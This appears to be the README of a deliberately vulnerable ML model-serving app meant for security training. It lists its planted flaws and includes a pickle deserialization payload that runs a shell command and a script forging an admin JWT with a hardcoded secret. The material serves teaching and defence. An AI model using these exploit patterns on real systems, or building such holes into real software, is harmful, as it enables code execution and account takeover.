# Damn Vulnerable Model Context Protocol (DVMCP)

DVMCP is a deliberately vulnerable application designed to demonstrate common security issues in ML model serving systems. It is intended for educational purposes to help security researchers and developers understand and learn about potential vulnerabilities in AI/ML systems.

**WARNING**: This application contains intentional security vulnerabilities. DO NOT deploy it in a production environment or expose it to the public internet.

## Installation

1. Clone this repository
2. Install dependencies:
```bash
pip install -r requirements.txt
```
3. Run the server:
```bash
python app.py
```

## Vulnerabilities

The application contains several intentional vulnerabilities:

### 1. Unsafe Model Deserialization (CWE-502)
- Endpoint: `/api/v1/model/load`
- The application accepts serialized model data using Python's pickle format
- No validation is performed on the deserialized content
- Attackers can execute arbitrary code through crafted pickle data

### 2. Model Input Injection (CWE-74)
- Endpoint: `/api/v1/model/predict`
- No input validation or sanitization
- Potential for model poisoning attacks
- Possibility of denial of service through malformed inputs

### 3. Weak Authentication (CWE-287)
- Endpoint: `/api/v1/admin/token`
- Hardcoded credentials
- Predictable token generation
- Weak secret key

### 4. Information Disclosure (CWE-200)
- Endpoint: `/api/v1/model/metadata`
- Leaks sensitive information about models
- Exposes memory addresses and internal attributes
- No access control

## Example Attacks

### Deserialization Attack
```python
import pickle
import os

class Evil:
    def __reduce__(self):
        return (os.system, ('id',))

with open('evil.pkl', 'wb') as f:
    pickle.dump(Evil(), f)
```

### Token Generation Attack
```python
import jwt

# Using the known secret key
token = jwt.encode(
    {'username': 'attacker', 'role': 'admin'},
    'very_vulnerable_secret_key',
    algorithm='HS256'
)
```

## Security Measures (In Real Systems)

1. Never use pickle for model serialization in production
2. Implement proper input validation and sanitization
3. Use strong authentication mechanisms
4. Implement proper access control
5. Use secure model serving frameworks
6. Implement rate limiting
7. Use proper error handling that doesn't leak sensitive information

## Disclaimer

This application is for educational purposes only. The vulnerabilities are intentional and should be used only in a controlled environment for learning about AI/ML system security. 